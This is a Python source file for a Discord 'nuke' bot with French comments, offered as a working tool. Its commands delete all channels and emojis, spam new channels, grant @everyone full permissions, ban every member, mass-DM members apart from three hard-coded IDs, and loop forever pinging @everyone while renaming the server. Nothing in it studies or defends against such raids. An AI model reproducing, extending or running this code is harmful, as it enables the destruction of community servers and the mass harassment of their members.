import discord
import os
from discord.ext import commands,tasks
from colorama import Fore
import ctypes
import random

#clear la console
os.system("clear")

#variable
intents = discord.Intents().all()
serverName = "Nuke"
bot = commands.Bot(command_prefix=">",intents=intents)



@bot.event
async def on_ready():
    print("le bot est pret...")
    await bot.change_presence(status=discord.Status.online, activity=discord.Game(name="type >help"))



@bot.command(name='nuke')
async def nuke(ctx):
	await ctx.message.delete()
	for channel in ctx.guild.channels:
		await channel.delete()
		channel = await ctx.guild.create_text_channel("nuke")

@bot.command(name='channelspam')
async def channelspam(ctx, amount, channelname):
	await ctx.message.delete()
	for x in range(int(amount)):
		channel = await ctx.guild.create_text_channel(channelname)


@bot.command(name='perm')
async def perms(ctx):
	await ctx.message.delete()
	everyonerole = discord.utils.get(ctx.guild.roles, name="@everyone")
	await everyonerole.edit(permissions = discord.Permissions().all())


@bot.command(name='random')
async def randomize(ctx):
	await ctx.message.delete()
	while True:
		await ctx.guild.edit(name=''.join(random.sample(serverName, len(serverName))))


@bot.command(name='massdm')
async def massdm(ctx, *, text):
	await ctx.message.delete()
	members = ctx.guild.members
	for member in members:
		if member.id == 622541545916334080 or member.id == 355402435893919754 or member.id == 431502422431760394:
			print(member.id,"stop")
			pass
		else :
			print(member.id)
			await member.send(text)

@bot.command(name='spam')
async def spam(ctx, amount, message):
	await ctx.message.delete()
	for x in range(int(amount)):
		for channel in ctx.guild.channels:
			await channel.send(message)

@bot.command(name='ban')
async def ban(ctx):
	for member in ctx.guild.members:
		try:
			await member.ban(reason="BRUH")
		except:
			pass

@bot.command(name='chaos')
async def chaos(ctx):
	for emoji in list(ctx.guild.emojis):
		await emoji.delete()

	for channel in ctx.guild.channels:
		await channel.delete()
		channel = await ctx.guild.create_text_channel("BRUH")

	for x in range(20):
		channel = await ctx.guild.create_text_channel("BRUH")
			
	while True:
		for channel in ctx.guild.channels:
			await channel.send("@everyone")
			await ctx.guild.edit(name=''.join(random.sample(serverName, len(serverName))))

@bot.command(name='name')
async def flaviendestruction(ctx):

	for channel in ctx.guild.channels:
		await channel.delete()

	for x in range(1):
		channel = await ctx.guild.create_text_channel("name")
			
	while True:
		for channel in ctx.guild.channels:
			await channel.send("@everyone name")

@bot.command()
async def delchannel(ctx):
	for channel in ctx.guild.channels:
		await channel.delete()

bot.run("")
